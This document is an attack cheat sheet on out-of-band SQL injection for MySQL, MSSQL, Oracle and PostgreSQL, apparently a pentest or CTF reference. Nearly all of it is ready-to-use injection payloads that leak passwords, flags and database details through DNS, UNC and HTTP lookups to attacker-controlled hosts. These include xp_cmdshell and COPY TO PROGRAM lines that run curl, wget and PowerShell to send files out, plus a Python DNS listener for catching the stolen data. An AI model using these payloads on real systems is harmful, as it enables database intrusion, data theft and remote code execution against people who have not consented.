# Out-of-band SQLi — extraction through DNS/HTTP/SMB

The page says nothing at all: identical bodies, identical status,
identical timing (or unmeasurable). If the database host can still
reach the network, make the QUERY itself place the call — the
extracted value travels as the DNS label / URL path / UNC filename
the DBMS resolves. One request can carry ~60 bytes of answer.

You need an interaction listener you control: a `*.oob` domain you
own, interactsh, Burp Collaborator, or a plain `dnsmasq`/nc listener
on a VPS. In local CTF/lab setups a raw `tcpdump -i any udp port 53`
on the box is enough.

---

## 1. MySQL — UNC path (Windows servers) + DNS

`LOAD_FILE` and `INTO OUTFILE` accept UNC paths on Windows builds —
resolving `\\host\share` triggers an SMB/DNS lookup:

```sql
' AND LOAD_FILE('\\\\your.oob.domain\\a')-- -
' UNION SELECT LOAD_FILE('\\\\version().your.oob\\a')-- -
-- with data embedded as the host label:
' UNION SELECT LOAD_FILE(CONCAT('\\\\',HEX(@@version),'.oob\\a'))-- -
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
   (SELECT password FROM users LIMIT 1),'.oob\\a'))-- -
```

Hostname limit ~63 chars per label → hex-encode or chunk:

```sql
LOAD_FILE(CONCAT('\\\\',SUBSTRING(HEX(secret),1,50),'.oob\\x'))
LOAD_FILE(CONCAT('\\\\',SUBSTRING(HEX(secret),51,50),'.oob\\x'))
```

Notes:

- Works only where SMB egress (445) or DNS (53) leaves the DB host —
  Windows MySQL almost always tries both; Linux MySQL skips UNC
  silently (no lookup) → feature, not bug: silence means wrong OS.
- `secure_file_priv` does NOT block LOAD_FILE reading UNC.
- MariaDB same syntax.

DNS fallback that works on Linux too (initiate a resolver query
without file I/O) — there is none built-in; MySQL OOB is essentially
UNC-only. If Linux + no egress function → this channel is dead.

---

## 2. MSSQL — the richest OOB surface

`xp_dirtree`, `xp_subdirs`, `xp_fileexist`, `OPENROWSET` against UNC —
all trigger SMB+DNS:

```sql
'; EXEC master..xp_dirtree '\\uniq.oob\a'-- -
'; EXEC master.dbo.xp_subdirs '\\uniq.oob\a'-- -
'; EXEC master..xp_fileexist '\\uniq.oob\a'-- -
'; DECLARE @q varchar(200); SET @q='\\'+CAST(@@version AS varchar)
   +'.oob\a'; EXEC master.dbo.xp_dirtree @q-- -
```

With data:

```sql
'; DECLARE @d varchar(64); SELECT @d=CAST(name AS varchar) FROM
   sys.databases WHERE database_id=1;
   EXEC master.dbo.xp_dirtree ('\\'+@d+'.oob\a')-- -
```

No stacked queries? The same functions run inside the SELECT:

```sql
' AND (SELECT CAST(name AS varchar) FROM sys.tables
   WHERE 1=(SELECT master.dbo.xp_fileexist('\\x.oob')))-- -   -- hmm
-- more reliable non-stacked form:
' UNION SELECT 1,2,master.dbo.xp_fileexist('\\x.oob\a')-- -
' UNION SELECT 1,2,master.sys.fn_varbintohexstr(
   CAST('x' AS varbinary))-- -
```

Extended OOB via OLE automation / linked servers (needs sysadmin
more often):

```sql
'; EXEC sp_OACreate 'MSXML2.XMLHTTP',@x OUT;
   EXEC sp_OAMethod @x,'open',NULL,'GET','http://u.oob/',0;
   EXEC sp_OAMethod @x,'send'-- -
'; EXEC master..xp_cmdshell 'nslookup '+@d+'.oob'-- -     -- cmd needed
'; SELECT * FROM OPENROWSET('SQLOLEDB','uid=x;pwd=y;server=\
   u.oob','select 1')-- -                                  -- UNC as server
```

`xp_dirtree` is the gold standard: enabled by default on many
builds, callable as `master..xp_dirtree`, resolves UNC, fails
silently afterwards.

---

## 3. Oracle — UTL_* network functions

Oracle ships real network primitives; HTTP egress is often OPEN when
a resolver is not:

```sql
-- DNS lookup, classic
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('uniq.oob') FROM dual)
   IS NULL-- -
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('uniq.oob') FROM dual-- -
' UNION SELECT UTL_INADDR.GET_HOST_NAME('10.0.0.1') FROM dual-- -

-- HTTP request carrying data
' UNION SELECT UTL_HTTP.REQUEST('http://oob/' ||
   (SELECT user FROM dual)) FROM dual-- -
' UNION SELECT UTL_HTTP.REQUEST('http://oob/' ||
   REPLACE((SELECT banner FROM v$version WHERE rownum=1),' ','_'))
   FROM dual-- -

-- HTTPURITYPE object
' UNION SELECT HTTPURITYPE('http://oob/' || user).GETCLOB()
   FROM dual-- -

-- UTL_TCP — raw socket, needs ACL grant on 11g+
' AND (SELECT UTL_TCP.OPEN_CONNECTION('oob',80,5) FROM dual)
   IS NOT NULL-- -
```

ACL denied → `ORA-24247 network access denied by access control
list` — that error itself is a signal the function exists; then
route via `DBMS_LDAP`/`SYS.KUPP$PROC` variants or fall back blind.

Oracle 12c+ restricts UTL_HTTP by ACL — `UTL_INADDR` is the most
permissive legacy path; also try:

```sql
' AND (SELECT DBMS_LDAP.INIT('oob',80) FROM dual) IS NOT NULL-- -
' UNION SELECT EXTRACTVALUE(xmltype('<x>'||user||'</x>'),'/x')
   FROM dual-- -                                  -- not oob, but check
' UNION SELECT SYS.KUPP$PROC.CREATE_MASTER_PROCESS() FROM dual-- -
```

---

## 4. PostgreSQL — COPY/dblink/large objects

No DNS-by-default function, but superuser paths exist:

```sql
-- dblink self-connect over a loopback — internal, not oob
'; SELECT * FROM dblink('host=u.oob user=x dbname=y','select 1')
   AS t(int)-- -                                   -- needs dblink ext

-- COPY to PROGRAM — RCE, but also the DNS lever:
'; COPY (SELECT '') TO PROGRAM 'nslookup '+((SELECT version())||'.oob')-- -
'; COPY (SELECT '') TO PROGRAM 'wget http://oob/`whoami`'-- -
```

OOB via `lo_import`/network is absent — Postgres OOB mostly means
"we got COPY PROGRAM which is already RCE" or an extension
(http, plpython3u, plperlu):

```sql
' ; SELECT http_get('http://oob/'||current_database())-- -   -- pgsql-http ext
' ; SELECT plpy.eval('import urllib2;urllib2.urlopen(
   "http://oob/")')-- -                                       -- plpython3u
```

When none exist, Postgres OOB is dead — use time (generate_series
CPU) or error cast.

---

## 5. SQLite — essentially none

SQLite has no network functions. The only quasi-OOB: `ATTACH
DATABASE 'http://...'` doesn't exist; `load_extension` needs a local
path. Treat SQLite as strictly blind.

---

## 6. Extraction engineering

Label packing:

- DNS label ≤ 63 chars, domain ≤ 253 total. Hex-encode the value
  (`HEX(secret)`) — avoids charset issues and doubles size safely
  (2×~30 = 60 chars fits one label).
- Split long values: `SUBSTRING(HEX(v),1,50)` then `,51,50)` —
  sequential lookups in order.
- Randomize the trigger label: `\\<hex(secret)>.SUFFIX.oob` — a
  UNIQUE suffix per run proves the lookup came from YOUR request
  (dedupe caching resolvers by including a nonce:
  `CONCAT(HEX(secret),'.',FLOOR(RAND()*9999),'.oob')`).
- Escape: never put raw `'"/\\` inside a UNC — hex-encode first.

Order of attempts:

```text
MSSQL:  xp_dirtree > xp_subdirs > xp_fileexist > OPENROWSET > sp_OA
Oracle: UTL_INADDR.GET_HOST_ADDRESS > UTL_HTTP.REQUEST > HTTPURITYPE
        > DBMS_LDAP.INIT
MySQL:  LOAD_FILE('\\\\..\\')      (Windows only)
PG:     COPY ... TO PROGRAM (superuser) > extension http/plpython
```

---

## 7. Listener notes

- interactsh client / Burp Collaborator: poll for the label —
  the captured subdomain IS your extracted value.
- Own domain: point a wildcard NS record at a box running
  `dnsmasq --log-queries` or 30-line Python UDP:53 listener —
  log the full qname.
- HTTP listener for UTL_HTTP paths: any HTTP server logging the
  request line suffices (`nc -l 80`, `python -m http.server`,
  webhook.site).
- SMB listener for UNC follow-through (`impacket-smbserver`) —
  optional; DNS lookup alone already proves the channel.

---

## 8. Failure modes

| Symptom | Reading |
|---|---|
| No lookup at all | no egress (blocked 53/445/80) or function absent |
| `ORA-24247` | Oracle ACL — try UTL_INADDR or fall back |
| `xp_... not found` | extended procs disabled — try next one |
| DNS lookup lands, data truncated | label limit — chunk with SUBSTRING |
| Intermittent misses | resolver caching — add nonce label |

An OOB hit is the strongest possible proof of injection — record the
listener log line verbatim as the evidence excerpt.

---

## 9. Standing up a DNS listener — the 30-line recipe

For when interactsh/collaborator aren't reachable — a Python
UDP:53 listener that logs the full qname:

```python
#!/usr/bin/env python3
import socket,struct
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind(('0.0.0.0',53))
while True:
    d,a=s.recvfrom(512)
    q=b''; i=12
    while d[i]: q+=d[i+1:i+1+d[i]]+b'.'; i+=1+d[i]
    print(a[0],q.decode('latin1'))
    # minimal NXDOMAIN-style reply
    r=d[:2]+b'\x81\x83'+d[4:6]+b'\x00\x00\x00\x00'+d[12:]
    s.sendto(r,a)
```

Point a wildcard NS at it (`*.oob.example.com NS ns1.box`), trigger
the payload, and the label IS the extraction. For a lab without a
domain: `dnsmasq --log-queries` on the same box, or an interactsh
self-hosted server.

Chunking labels — each DNS label ≤ 63 bytes, qname ≤ 253:

```sql
' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(
   (SELECT flag FROM secrets),1,30)),'.oob.example.com\\a'))-- -
   -- hex → 60 chars of label per chunk → fits in one label
' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(
   (SELECT flag FROM secrets),31,30)),'.oob.example.com\\a'))-- -
' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(
   (SELECT flag FROM secrets),61,30)),'.oob.example.com\\a'))-- -
```

Raw data (not hex) works too but loses on non-alphanumeric bytes —
hex is the safe carrier, 2 chars/byte so 30-byte chunks.

---

## 10. HTTP OOB — when the DB can fetch

```sql
-- Oracle UTL_HTTP (needs ACL grant on 11g+):
' AND 1=utl_http.request('http://me/'||rawtohex(
   (SELECT flag FROM secrets WHERE ROWNUM=1)))-- -
' AND 1=utl_http.request('http://me/'||(SELECT flag))-- -
' AND 1=utl_http.request('http://me:8080/'||(SELECT flag))-- -

-- HTTPURITYPE — the gentler path (older ACLs):
' AND 1=httpuritype('http://me/'||(SELECT flag)).getclob()-- - -- O? actually returns CLOB — 
' AND (SELECT httpuritype('http://me/'||(SELECT flag)||'.me.com')
   .getclob() FROM dual) IS NOT NULL-- -

-- MSSQL via OPENROWSET+SQLOLEDB back to a rogue SQL server — the
-- returned server responds with the flag as an error field; rare,
-- but documented. Easier: xp_cmdshell curl/Invoke-WebRequest:
'; EXEC xp_cmdshell 'curl http://me/$(type c:\flag.txt|base64)';-- -
'; EXEC xp_cmdshell 'powershell -c "iwr http://me/$(gc c:\flag.txt)"';-- -

-- PG: COPY FROM PROGRAM (superuser):
'; COPY t(x) FROM PROGRAM 'curl http://me/$(cat /flag|base64)';-- -
   ' UNION SELECT x,NULL FROM t-- -                        -- or read locally

-- MySQL: no native HTTP fetch — the file/DNS channel is UNC-only.
-- The workaround is exec (rce-paths) or a stored-proc wrapper; on
-- Windows the UNC DNS lookup is the OOB.
```

HTTP OOB carries MORE per request than DNS — a URL path can hold
~2000 chars vs DNS's ~60 per label. Use it when `utl_http` /
`COPY ... FROM PROGRAM` / `xp_cmdshell`-curl is reachable.

Listener for HTTP OOB: `nc -l 80`, `python -m http.server 80`,
or a webhook.site/beeceptor endpoint — any request-line logger
captures the value in the path.

---

## 11. The "no egress" fallback — when DNS AND HTTP are both dead

```text
- ICMP/pings blocked too? → true airgap; drop to blind channels.
- Only TCP/80 out allowed? → HTTP OOB only (§10).
- Only DNS/53 out? → DNS labels only; hex-chunk everything (§9).
- Outbound to a WHITELIST only? → check if the whitelist accepts
  arbitrary subdomains — `attacker-allowed.com` style names, or
  exfil via the whitelisted host's own logging path.
- NOTHING out? → the primitive was never real for this DB; go back
  to boolean/time and extract in-band.
```

Egress testing: trigger a DNS lookup for a controlled label FIRST
(`\\ping.oob.example.com\a` via the same channel family) — no
lookup = no egress for that channel; don't waste a second payload.
